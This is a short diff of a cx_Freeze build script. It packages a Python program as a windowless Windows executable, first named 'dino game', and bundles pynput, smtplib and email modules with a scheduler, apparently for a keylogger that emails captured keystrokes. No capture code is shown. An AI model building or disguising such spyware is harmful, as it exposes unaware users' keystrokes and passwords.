@@ -4,10 +4,10 @@ import sys
 base=None
 if (sys.platform=="win32"):
     base="Win32GUI"
-executables = [cx_Freeze.Executable('jogo.py', base=base)]
+executables = [cx_Freeze.Executable('main.py', base=base)]
 
 cx_Freeze.setup(
-    name="dino game",
+    name="man.py",
     options={'build_exe': {'packages':['pynput','re','smtplib','email.mime.multipart',
     'email.mime.text','email.mime.base','email','schedule','time'],}},
 
